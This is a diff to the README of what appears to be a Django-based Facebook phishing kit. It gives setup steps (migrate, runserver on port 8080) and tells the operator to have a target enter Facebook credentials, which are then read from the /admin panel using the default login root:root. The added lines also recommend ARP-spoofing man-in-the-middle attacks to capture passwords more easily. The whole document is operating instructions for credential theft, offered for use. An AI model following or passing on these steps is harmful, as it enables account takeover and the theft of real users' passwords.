@@ -16,20 +16,24 @@ Download Links:
 
 # Make Backened
 * python manage.py makemigrations
+* python manage.py migrate
 * python manage.py createsuperuser (this for creating admin username and password)
 
 # Run Server
-* python manage.py runserver 0.0.0.0:80
+* python manage.py runserver 0.0.0.0:8080
 
 # Target User
-* Open Link <Your IP> EX. 127.0.0.1:80
+* Open Link <Your IP> EX. 127.0.0.1:8080
 * Enter Facebook Username and Password
   
 # Look for Password
-* Open <Your IP>:<Port>/admin in browser Ex. 127.0.0.1:80/admin
+* Open <Your IP>:<Port>/admin in browser Ex. 127.0.0.1:8080/admin
 
 # Admin Usernam:Password
 * root:root
+
+# Tricks to Hack Password Easily
+* use MITM (Arp Spoofing)
 
 # Reports Bugs and Feedback
 * https://m.me/B14CKH4K3R
